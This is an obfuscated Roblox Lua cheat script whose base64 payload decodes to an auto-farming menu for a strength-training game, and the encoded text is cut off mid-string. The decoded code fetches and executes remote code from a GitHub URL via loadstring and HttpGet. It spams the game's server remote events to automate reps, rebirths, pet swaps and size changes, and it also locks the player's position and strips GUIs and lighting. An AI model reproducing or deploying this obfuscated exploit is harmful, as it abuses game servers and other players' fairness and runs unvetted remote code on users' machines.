--[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-12-22 00:38:32]] (function() local __b = "Ci0tW1tTb3VyY2UgTGVhayBTZW4gVjMgRGVvYmYudHh0XV0KCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBIdHRwU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQoKbG9jYWwgbG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHVzZXJuYW1lID0gbG9jYWxQbGF5ZXIuTmFtZQpsb2NhbCB1c2VySWQgPSBsb2NhbFBsYXllci5Vc2VySWQKCmxvY2FsIFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFZpcnR1YWxJbnB1dE1hbmFnZXIgPSBnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxJbnB1dE1hbmFnZXIiKQpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCBtdXNjbGVFdmVudCA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIm11c2NsZUV2ZW50IikKbG9jYWwgbGVhZGVyc3RhdHMgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJsZWFkZXJzdGF0cyIpCmxvY2FsIHJlYmlydGhzU3RhdCA9IGxlYWRlcnN0YXRzOldhaXRGb3JDaGlsZCgiUmViaXJ0aHMiKQoKbG9jYWwgbGlicmFyeSA9IGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbGtqaGc5NjkvZmZkc2YvcmVmcy9oZWFkcy9tYWluL2hnZmhqIiwgdHJ1ZSkpKCkKCmxvY2FsIHdpbmRvdyA9IGxpYnJhcnk6QWRkV2luZG93KCJTaWxlbmNlIHwgRmFybWluZyB8IERlb2JmdXNjYXRlZCBieSBTZW4iLCB7CiAgICBtYWluX2NvbG9yID0gQ29sb3IzLmZyb21SR0IoMTM4LCAwLCAwKSwKICAgIG1pbl9zaXplID0gVmVjdG9yMi5uZXcoNjAwLCA2MDApLAogICAgY2FuX3Jlc2l6ZSA9IGZhbHNlCn0pCgpsb2NhbCByZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQpsb2NhbCBibG9ja2VkRnJhbWVzID0gewogICAgInN0cmVuZ3RoRnJhbWUiLAogICAgImR1cmFiaWxpdHlGcmFtZSIsCiAgICAiYWdpbGl0eUZyYW1lIiwKfQoKZm9yIF8sIG5hbWUgaW4gaXBhaXJzKGJsb2NrZWRGcmFtZXMpIGRvCiAgICBsb2NhbCBmcmFtZSA9IHJlcGxpY2F0ZWRTdG9yYWdlOkZpbmRGaXJzdENoaWxkKG5hbWUpCiAgICBpZiBmcmFtZSBhbmQgZnJhbWU6SXNBKCJHdWlPYmplY3QiKSB0aGVuCiAgICAgICAgZnJhbWUuVmlzaWJsZSA9IGZhbHNlCiAgICBlbmQKZW5kCgpyZXBsaWNhdGVkU3RvcmFnZS5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICBpZiB0YWJsZS5maW5kKGJsb2NrZWRGcmFtZXMsIGNoaWxkLk5hbWUpIGFuZCBjaGlsZDpJc0EoIkd1aU9iamVjdCIpIHRoZW4KICAgICAgICBjaGlsZC5WaXNpYmxlID0gZmFsc2UKICAgIGVuZAplbmQpCgpsb2NhbCBGYXN0UmViVGFiID0gd2luZG93OkFkZFRhYigiRmFzdCBSZWJpcnRoIikKCmxvY2FsIGZ1bmN0aW9uIGZvcm1hdE51bWJlcihudW0pCiAgICBpZiBudW0gPj0gMWUxNSB0aGVuIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjJmUSIsIG51bS8xZTE1KSBlbmQKICAgIGlmIG51bSA+PSAxZTEyIHRoZW4gcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMmZUIiwgbnVtLzFlMTIpIGVuZAogICAgaWYgbnVtID49IDFlOSB0aGVuIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjJmQiIsIG51bS8xZTkpIGVuZAogICAgaWYgbnVtID49IDFlNiB0aGVuIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjJmTSIsIG51bS8xZTYpIGVuZAogICAgaWYgbnVtID49IDFlMyB0aGVuIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjJmSyIsIG51bS8xZTMpIGVuZAogICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMGYiLCBudW0pCmVuZAoKbG9jYWwgaXNSdW5uaW5nID0gZmFsc2UKbG9jYWwgc3RhcnRUaW1lID0gMApsb2NhbCB0b3RhbEVsYXBzZWQgPSAwCmxvY2FsIGluaXRpYWxSZWJpcnRocyA9IHJlYmlydGhzU3RhdC5WYWx1ZQpsb2NhbCBsYXN0UGFjZVVwZGF0ZSA9IDAKCmxvY2FsIHNlcnZlckxhYmVsID0gRmFzdFJlYlRhYjpBZGRMYWJlbCgiVGltZToiKQpzZXJ2ZXJMYWJlbC5UZXh0U2l6ZSA9IDIwCmxvY2FsIHRpbWVMYWJlbCA9IEZhc3RSZWJUYWI6QWRkTGFiZWwoIjBkIDBoIDBtIDBzIC0gSW5hY3RpdmUiKQpsb2NhbCBwYWNlTGFiZWwgPSBGYXN0UmViVGFiOkFkZExhYmVsKCJQYWNlOiAwIC8gSG91ciB8IDAgLyBEYXkgfCAwIC8gV2VlayIpCmxvY2FsIGF2ZXJhZ2VQYWNlTGFiZWwgPSBGYXN0UmViVGFiOkFkZExhYmVsKCJBdmVyYWdlIFBhY2U6IDAgLyBIb3VyIHwgMCAvIERheSB8IDAgLyBXZWVrIikKCnBhY2VMYWJlbC5UZXh0U2l6ZSA9IDE3CmF2ZXJhZ2VQYWNlTGFiZWwuVGV4dFNpemUgPSAxNwoKCnRpbWVMYWJlbC5UZXh0U2l6ZSA9IDE3CnRpbWVMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCnBhY2VMYWJlbC5UZXh0U2l6ZSA9IDE3Cgpsb2NhbCByZWJpcnRoc1N0YXRzTGFiZWwgPSBGYXN0UmViVGFiOkFkZExhYmVsKCJSZWJpcnRoczogIi4uZm9ybWF0TnVtYmVyKHJlYmlydGhzU3RhdC5WYWx1ZSkuLiIgfCBHYWluZWQ6IDAiKQpyZWJpcnRoc1N0YXRzTGFiZWwuVGV4dFNpemUgPSAxNwoKCmxvY2FsIGxhc3RSZWJpcnRoVGltZSA9IHRpY2soKQpsb2NhbCBsYXN0UmViaXJ0aFZhbHVlID0gcmViaXJ0aHNTdGF0LlZhbHVlCgpsb2NhbCBmdW5jdGlvbiB1cGRhdGVSZWJpcnRoc0xhYmVsKCkKICAgIGxvY2FsIGdhaW5lZCA9IHJlYmlydGhzU3RhdC5WYWx1ZSAtIGluaXRpYWxSZWJpcnRocwogICAgcmViaXJ0aHNTdGF0c0xhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCJSZWJpcnRoczogJXMgfCBHYWluZWQ6ICVzIiwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXROdW1iZXIocmViaXJ0aHNTdGF0LlZhbHVlKSwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JtYXROdW1iZXIoZ2FpbmVkKSkKZW5kCgpsb2NhbCBmdW5jdGlvbiB1cGRhdGVVSShmb3JjZVVwZGF0ZSkKICAgIGxvY2FsIGN1cnJlbnRUaW1lID0gdGljaygpCiAgICBsb2NhbCBlbGFwc2VkID0gaXNSdW5uaW5nIGFuZCAoY3VycmVudFRpbWUgLSBzdGFydFRpbWUgKyB0b3RhbEVsYXBzZWQpIG9yIHRvdGFsRWxhcHNlZAogICAgCiAgICBsb2NhbCBkYXlzID0gbWF0aC5mbG9vcihlbGFwc2VkIC8gODY0MDApCiAgICBsb2NhbCBob3VycyA9IG1hdGguZmxvb3IoKGVsYXBzZWQgJSA4NjQwMCkgLyAzNjAwKQogICAgbG9jYWwgbWludXRlcyA9IG1hdGguZmxvb3IoKGVsYXBzZWQgJSAzNjAwKSAvIDYwKQogICAgbG9jYWwgc2Vjb25kcyA9IG1hdGguZmxvb3IoZWxhcHNlZCAlIDYwKQogICAgCiAgICB0aW1lTGFiZWwuVGV4dCA9IHN0cmluZy5mb3JtYXQoIiVkZCAlZGggJWRtICVkcyAtICVzIiwgZGF5cywgaG91cnMsIG1pbnV0ZXMsIHNlY29uZHMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzUnVubmluZyBhbmQgIlJlYmlydGhpbmciIG9yICJQYXVzZWQiKQogICAgdGltZUxhYmVsLlRleHRDb2xvcjMgPSBpc1J1bm5pbmcgYW5kIENvbG9yMy5mcm9tUkdCKDUwLCAyNTUsIDUwKSBvciBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkKZW5kCgpsb2NhbCBsYXN0UmViaXJ0aFRpbWUgPSB0aWNrKCkKbG9jYWwgbGFzdFJlYmlydGhWYWx1ZSA9IHJlYmlydGhzU3RhdC5WYWx1ZQoKbG9jYWwgcGFjZUhpc3RvcnlIb3VyID0ge30KbG9jYWwgcGFjZUhpc3RvcnlEYXkgPSB7fQpsb2NhbCBwYWNlSGlzdG9yeVdlZWsgPSB7fQoKbG9jYWwgbWF4SGlzdG9yeUxlbmd0aCA9IDIwCgpsb2NhbCByZWJpcnRoQ291bnQgPSAwCgpsb2NhbCBmdW5jdGlvbiBjYWxjdWxhdGVQYWNlT25SZWJpcnRoKCkKICAgIHJlYmlydGhDb3VudCA9IHJlYmlydGhDb3VudCArIDEKICAgIAogICAgLS0gRXJzdCBhYiBkZW0gMi4gUmViaXJ0aCBiZXJlY2huZW4KICAgIGlmIHJlYmlydGhDb3VudCA8IDIgdGhlbgogICAgICAgIGxhc3RSZWJpcnRoVGltZSA9IHRpY2soKQogICAgICAgIGxhc3RSZWJpcnRoVmFsdWUgPSByZWJpcnRoc1N0YXQuVmFsdWUKICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIG5vdyA9IHRpY2soKQogICAgbG9jYWwgZ2FpbmVkID0gcmViaXJ0aHNTdGF0LlZhbHVlIC0gbGFzdFJlYmlydGhWYWx1ZQoKICAgIGlmIGdhaW5lZCA+IDAgdGhlbgogICAgICAgIGxvY2FsIGF2Z1RpbWVQZXJSZWJpcnRoID0gKG5vdyAtIGxhc3RSZWJpcnRoVGltZSkgLyBnYWluZWQKICAgICAgICBsb2NhbCBwYWNlSG91ciA9IDM2MDAgLyBhdmdUaW1lUGVyUmViaXJ0aAogICAgICAgIGxvY2FsIHBhY2VEYXkgPSA4NjQwMCAvIGF2Z1RpbWVQZXJSZWJpcnRoCiAgICAgICAgbG9jYWwgcGFjZVdlZWsgPSA2MDQ4MDAgLyBhdmdUaW1lUGVyUmViaXJ0aAoKICAgICAgICBwYWNlTGFiZWwuVGV4dCA9IHN0cmluZy5mb3JtYXQoIlBhY2U6ICVzIC8gSG91ciB8ICVzIC8gRGF5IHwgJXMgLyBXZWVrIiwKICAgICAgICAgICAgZm9ybWF0TnVtYmVyKHBhY2VIb3VyKSwgZm9ybWF0TnVtYmVyKHBhY2VEYXkpLCBmb3JtYXROdW1iZXIocGFjZVdlZWspKQoKICAgICAgICB0YWJsZS5pbnNlcnQocGFjZUhpc3RvcnlIb3VyLCBwYWNlSG91cikKICAgICAgICB0YWJsZS5pbnNlcnQocGFjZUhpc3RvcnlEYXksIHBhY2VEYXkpCiAgICAgICAgdGFibGUuaW5zZXJ0KHBhY2VIaXN0b3J5V2VlaywgcGFjZVdlZWspCgogICAgICAgIGlmICNwYWNlSGlzdG9yeUhvdXIgPiBtYXhIaXN0b3J5TGVuZ3RoIHRoZW4KICAgICAgICAgICAgdGFibGUucmVtb3ZlKHBhY2VIaXN0b3J5SG91ciwgMSkKICAgICAgICAgICAgdGFibGUucmVtb3ZlKHBhY2VIaXN0b3J5RGF5LCAxKQogICAgICAgICAgICB0YWJsZS5yZW1vdmUocGFjZUhpc3RvcnlXZWVrLCAxKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBmdW5jdGlvbiBhdmVyYWdlKHRibCkKICAgICAgICAgICAgbG9jYWwgc3VtID0gMAogICAgICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnModGJsKSBkbwogICAgICAgICAgICAgICAgc3VtID0gc3VtICsgdgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcmV0dXJuICN0YmwgPiAwIGFuZCAoc3VtIC8gI3RibCkgb3IgMAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBhdmdIb3VyID0gYXZlcmFnZShwYWNlSGlzdG9yeUhvdXIpCiAgICAgICAgbG9jYWwgYXZnRGF5ID0gYXZlcmFnZShwYWNlSGlzdG9yeURheSkKICAgICAgICBsb2NhbCBhdmdXZWVrID0gYXZlcmFnZShwYWNlSGlzdG9yeVdlZWspCgogICAgICAgIGF2ZXJhZ2VQYWNlTGFiZWwuVGV4dCA9IHN0cmluZy5mb3JtYXQoIkF2ZXJhZ2UgUGFjZTogJXMgLyBIb3VyIHwgJXMgLyBEYXkgfCAlcyAvIFdlZWsiLAogICAgICAgICAgICBmb3JtYXROdW1iZXIoYXZnSG91ciksIGZvcm1hdE51bWJlcihhdmdEYXkpLCBmb3JtYXROdW1iZXIoYXZnV2VlaykpCgogICAgICAgIGxhc3RSZWJpcnRoVGltZSA9IG5vdwogICAgICAgIGxhc3RSZWJpcnRoVmFsdWUgPSByZWJpcnRoc1N0YXQuVmFsdWUKICAgIGVuZAplbmQKCgoKCnJlYmlydGhzU3RhdDpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlZhbHVlIik6Q29ubmVjdChmdW5jdGlvbigpCiAgICBjYWxjdWxhdGVQYWNlT25SZWJpcnRoKCkKICAgIHVwZGF0ZVJlYmlydGhzTGFiZWwoKQplbmQpCgpsb2NhbCBmdW5jdGlvbiBtYW5hZ2VQZXRzKHBldE5hbWUpCiAgICBmb3IgXywgZm9sZGVyIGluIHBhaXJzKHBsYXllci5wZXRzRm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZm9sZGVyOklzQSgiRm9sZGVyIikgdGhlbgogICAgICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgcmVwbGljYXRlZFN0b3JhZ2UuckV2ZW50cy5lcXVpcFBldEV2ZW50OkZpcmVTZXJ2ZXIoInVuZXF1aXBQZXQiLCBwZXQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICB0YXNrLndhaXQoMC4xKQogICAgCiAgICBmb3IgXywgcGV0IGluIHBhaXJzKHBsYXllci5wZXRzRm9sZGVyLlVuaXF1ZTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHBldC5OYW1lID09IHBldE5hbWUgdGhlbgogICAgICAgICAgICByZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLmVxdWlwUGV0RXZlbnQ6RmlyZVNlcnZlcigiZXF1aXBQZXQiLCBwZXQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBkb1JlYmlydGgoKQogICAgbG9jYWwgcmViaXJ0aHMgPSByZWJpcnRoc1N0YXQuVmFsdWUKICAgIGxvY2FsIHN0cmVuZ3RoVGFyZ2V0ID0gNTAwMCArIChyZWJpcnRocyAqIDI1NTApCiAgICAKICAgIHdoaWxlIGlzUnVubmluZyBhbmQgcGxheWVyLmxlYWRlcnN0YXRzLlN0cmVuZ3RoLlZhbHVlIDwgc3RyZW5ndGhUYXJnZXQgZG8KICAgICAgICBsb2NhbCByZXBzID0gcGxheWVyLk1lbWJlcnNoaXBUeXBlID09IEVudW0uTWVtYmVyc2hpcFR5cGUuUHJlbWl1bSBhbmQgOCBvciAxNAogICAgICAgIGZvciBfID0gMSwgcmVwcyBkbwogICAgICAgICAgICBtdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgwLjAyKQogICAgZW5kCiAgICAKICAgIGlmIGlzUnVubmluZyBhbmQgcGxheWVyLmxlYWRlcnN0YXRzLlN0cmVuZ3RoLlZhbHVlID49IHN0cmVuZ3RoVGFyZ2V0IHRoZW4KICAgICAgICBtYW5hZ2VQZXRzKCJUcmliYWwgT3ZlcmxvcmQiKQogICAgICAgIHRhc2sud2FpdCgwLjI1KQogICAgICAgIAogICAgICAgIGxvY2FsIGJlZm9yZSA9IHJlYmlydGhzU3RhdC5WYWx1ZQogICAgICAgIHJlcGVhdAogICAgICAgICAgICByZXBsaWNhdGVkU3RvcmFnZS5yRXZlbnRzLnJlYmlydGhSZW1vdGU6SW52b2tlU2VydmVyKCJyZWJpcnRoUmVxdWVzdCIpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgIHVudGlsIHJlYmlydGhzU3RhdC5WYWx1ZSA+IGJlZm9yZSBvciBub3QgaXNSdW5uaW5nCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBmYXN0UmViaXJ0aExvb3AoKQogICAgd2hpbGUgaXNSdW5uaW5nIGRvCiAgICAgICAgbWFuYWdlUGV0cygiU3dpZnQgU2FtdXJhaSIpCiAgICAgICAgZG9SZWJpcnRoKCkKICAgICAgICB0YXNrLndhaXQoMC41KQogICAgZW5kCmVuZAoKRmFzdFJlYlRhYjpBZGRMYWJlbCgiIikKCmxvY2FsIFJlYmlydGhMYWJlbCA9IEZhc3RSZWJUYWI6QWRkTGFiZWwoIlJlYmlydGhpbmc6IikKUmViaXJ0aExhYmVsLlRleHRTaXplID0gMjAKCkZhc3RSZWJUYWI6QWRkU3dpdGNoKCJGYXN0IFJlYmlydGgiLCBmdW5jdGlvbihzdGF0ZSkKICAgIGlzUnVubmluZyA9IHN0YXRlCiAgICAKICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICBzdGFydFRpbWUgPSB0aWNrKCkKICAgICAgICB0YXNrLnNwYXduKGZhc3RSZWJpcnRoTG9vcCkKICAgIGVsc2UKICAgICAgICB0b3RhbEVsYXBzZWQgPSB0b3RhbEVsYXBzZWQgKyAodGljaygpIC0gc3RhcnRUaW1lKQogICAgICAgIHVwZGF0ZVVJKHRydWUpCiAgICBlbmQKZW5kKQoKcmViaXJ0aHNTdGF0OkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgiVmFsdWUiKTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIGlmIGlzUnVubmluZyB0aGVuCiAgICAgICAgY2FsY3VsYXRlUGFjZSgpCiAgICBlbmQKICAgIHVwZGF0ZVJlYmlydGhzTGFiZWwoKSAKZW5kKQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgdXBkYXRlVUkoZmFsc2UpCiAgICAgICAgdGFzay53YWl0KDAuMSkKICAgIGVuZAplbmQpCgoKbG9jYWwgcnVubmluZyA9IGZhbHNlCmxvY2FsIHRocmVhZCA9IG5pbAoKbG9jYWwgc2l6ZVN3aXRjaCA9IEZhc3RSZWJUYWI6QWRkU3dpdGNoKCJTZXQgU2l6ZSAxIiwgZnVuY3Rpb24oYm9vbCkKICAgIHJ1bm5pbmcgPSBib29sCiAgICBpZiBydW5uaW5nIHRoZW4KICAgICAgICB0aHJlYWQgPSBjb3JvdXRpbmUuY3JlYXRlKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgcnVubmluZyBkbwogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLnJFdmVudHMuY2hhbmdlU3BlZWRTaXplUmVtb3RlOkludm9rZVNlcnZlcigiY2hhbmdlU2l6ZSIsIDEpCiAgICAgICAgICAgICAgICB3YWl0KDAuMDEpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgICAgICBjb3JvdXRpbmUucmVzdW1lKHRocmVhZCkKICAgIGVuZAplbmQpCgpGYXN0UmViVGFiOkFkZEJ1dHRvbigiQW50aSBMYWciLCBmdW5jdGlvbigpCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIHBsYXllckd1aSA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCiAgICBsb2NhbCBsaWdodGluZyA9IGdhbWU6R2V0U2VydmljZSgiTGlnaHRpbmciKQoKICAgIGZvciBfLCBndWkgaW4gcGFpcnMocGxheWVyR3VpOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZ3VpOklzQSgiU2NyZWVuR3VpIikgdGhlbgogICAgICAgICAgICBndWk6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBkYXJrZW5Ta3koKQogICAgICAgIGZvciBfLCB2IGluIHBhaXJzKGxpZ2h0aW5nOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHY6SXNBKCJTa3kiKSB0aGVuCiAgICAgICAgICAgICAgICB2OkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZGFya1NreSA9IEluc3RhbmNlLm5ldygiU2t5IikKICAgICAgICBkYXJrU2t5Lk5hbWUgPSAiRGFya1NreSIKICAgICAgICBkYXJrU2t5LlNreWJveEJrID0gInJieGFzc2V0aWQ6Ly8wIgogICAgICAgIGRhcmtTa3kuU2t5Ym94RG4gPSAicmJ4YXNzZXRpZDovLzAiCiAgICAgICAgZGFya1NreS5Ta3lib3hGdCA9ICJyYnhhc3NldGlkOi8vMCIKICAgICAgICBkYXJrU2t5LlNreWJveExmID0gInJieGFzc2V0aWQ6Ly8wIgogICAgICAgIGRhcmtTa3kuU2t5Ym94UnQgPSAicmJ4YXNzZXRpZDovLzAiCiAgICAgICAgZGFya1NreS5Ta3lib3hVcCA9ICJyYnhhc3NldGlkOi8vMCIKICAgICAgICBkYXJrU2t5LlBhcmVudCA9IGxpZ2h0aW5nCgogICAgICAgIGxpZ2h0aW5nLkJyaWdodG5lc3MgPSAwCiAgICAgICAgbGlnaHRpbmcuQ2xvY2tUaW1lID0gMAogICAgICAgIGxpZ2h0aW5nLlRpbWVPZkRheSA9ICIwMDowMDowMCIKICAgICAgICBsaWdodGluZy5PdXRkb29yQW1iaWVudCA9IENvbG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICBsaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgIGxpZ2h0aW5nLkZvZ0NvbG9yID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgIGxpZ2h0aW5nLkZvZ0VuZCA9IDEwMAoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICAgICAgd2FpdCg1KQogICAgICAgICAgICAgICAgaWYgbm90IGxpZ2h0aW5nOkZpbmRGaXJzdENoaWxkKCJEYXJrU2t5IikgdGhlbgogICAgICAgICAgICAgICAgICAgIGRhcmtTa3k6Q2xvbmUoKS5QYXJlbnQgPSBsaWdodGluZwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsaWdodGluZy5CcmlnaHRuZXNzID0gMAogICAgICAgICAgICAgICAgbGlnaHRpbmcuQ2xvY2tUaW1lID0gMAogICAgICAgICAgICAgICAgbGlnaHRpbmcuT3V0ZG9vckFtYmllbnQgPSBDb2xvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICBsaWdodGluZy5BbWJpZW50ID0gQ29sb3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICAgICAgbGlnaHRpbmcuRm9nQ29sb3IgPSBDb2xvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICBsaWdodGluZy5Gb2dFbmQgPSAxMDAKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gcmVtb3ZlUGFydGljbGVFZmZlY3RzKCkKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBvYmo6SXNBKCJQYXJ0aWNsZUVtaXR0ZXIiKSB0aGVuCiAgICAgICAgICAgICAgICBvYmo6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gcmVtb3ZlTGlnaHRTb3VyY2VzKCkKICAgICAgICBmb3IgXywgb2JqIGluIHBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBvYmo6SXNBKCJQb2ludExpZ2h0Iikgb3Igb2JqOklzQSgiU3BvdExpZ2h0Iikgb3Igb2JqOklzQSgiU3VyZmFjZUxpZ2h0IikgdGhlbgogICAgICAgICAgICAgICAgb2JqOkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIHJlbW92ZVBhcnRpY2xlRWZmZWN0cygpCiAgICByZW1vdmVMaWdodFNvdXJjZXMoKQogICAgZGFya2VuU2t5KCkKZW5kKQoKRmFzdFJlYlRhYjpBZGRMYWJlbCgiIikKCmxvY2FsIG1pc2NMYWJlbCA9IEZhc3RSZWJUYWI6QWRkTGFiZWwoIk1pc2M6IikKbWlzY0xhYmVsLlRleHRTaXplID0gMjAKCmxvY2FsIGxvY2tSdW5uaW5nID0gZmFsc2UKbG9jYWwgbG9ja1RocmVhZCA9IG5pbAoKbG9jYWwgbG9ja1N3aXRjaCA9IEZhc3RSZWJUYWI6QWRkU3dpdGNoKCJMb2NrIFBvc2l0aW9uIiwgZnVuY3Rpb24oc3RhdGUpCiAgICBsb2NrUnVubmluZyA9IHN0YXRlCiAgICBpZiBsb2NrUnVubmluZyB0aGVuCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIGhycCA9IGNoYXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBsb2NhbCBsb2NrUG9zaXRpb24gPSBocnAuUG9zaXRpb24KCiAgICAgICAgbG9ja1RocmVhZCA9IGNvcm91dGluZS5jcmVhdGUoZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBsb2NrUnVubmluZyBkbwogICAgICAgICAgICAgICAgaHJwLlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgICAgICAgICAgICAgIGhycC5Sb3RWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICBocnAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhsb2NrUG9zaXRpb24pCiAgICAgICAgICAgICAgICB3YWl0KDAuMDUpIAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIGNvcm91dGluZS5yZXN1bWUobG9ja1RocmVhZCkKICAgIGVuZAplbmQpCgpsb2NhbCBmdW5jdGlvbiBhY3RpdmF0ZVNoYWtlKCkKICAgIGxvY2FsIHRvb2wgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJUcm9waWNhbCBTaGFrZSIpIG9yIHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiVHJvcGljYWwgU2hha2UiKQogICAgaWYgdG9vbCB0aGVuCiAgICAgICAgbXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigidHJvcGljYWxTaGFrZSIsIHRvb2wpCiAgICBlbmQKZW5kCgpsb2NhbCBydW5uaW5nID0gZmFsc2UKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGlmIHJ1bm5pbmcgdGhlbgogICAgICAgICAgICBhY3RpdmF0ZVNoYWtlKCkKICAgICAgICAgICAgdGFzay53YWl0KDQ1MCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGF1dG9zaGFrZVN3aXRjaCA9IEZhc3RSZWJUYWI6QWRkU3dpdGNoKCJBdXRvIFNoYWtlIiwgZnVuY3Rpb24oc3RhdGUpCiAgICBydW5uaW5nID0gc3RhdGUKICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICBhY3RpdmF0ZVNoYWtlKCkKICAgIGVuZAplbmQpCmF1dG9zaGFrZVN3aXRjaDpTZXQoZmFsc2UpCgpsb2NhbCBzcGlud2hlZWxTd2l0Y